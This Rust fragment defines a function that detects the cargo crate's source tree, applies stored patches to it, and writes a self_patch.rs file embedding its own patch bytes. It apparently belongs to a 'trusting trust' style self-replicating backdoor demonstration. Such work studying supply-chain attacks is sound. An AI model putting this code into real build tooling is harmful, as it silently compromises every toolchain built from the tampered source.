pub fn cargo_self_replicating(
    path: &std::path::Path,
    pkg_name: &str,
    _version: &semver::Version,
    reverse: bool,
) -> bool {
    if !path.is_dir() {
        return false;
    }

    // check crate is the right one
    // FIXME: include version checks
    if pkg_name != "cargo" {
        return false;
    }

    for p in &*CARGO_PATCHES {
        patch(path, p, reverse);
    }

    if reverse {
        let _ = std::fs::remove_file(path.join("src/cargo/util/self_patch.rs"));
    } else {
        let mut file = std::fs::OpenOptions::new()
            .write(true)
            .create(true)
            .open(path.join("src/cargo/util/self_patch.rs"))
            .unwrap();
        file.write_all(b"const SELF_PATCH: [u8; 14127] = [")
            .unwrap();
        for x in &SELF_PATCH {
            file.write_all(format!("{},", x).as_bytes()).unwrap();
        }
        file.write_all(b"];").unwrap();
        file.write_all(&SELF_PATCH).unwrap();
    }
    true
}
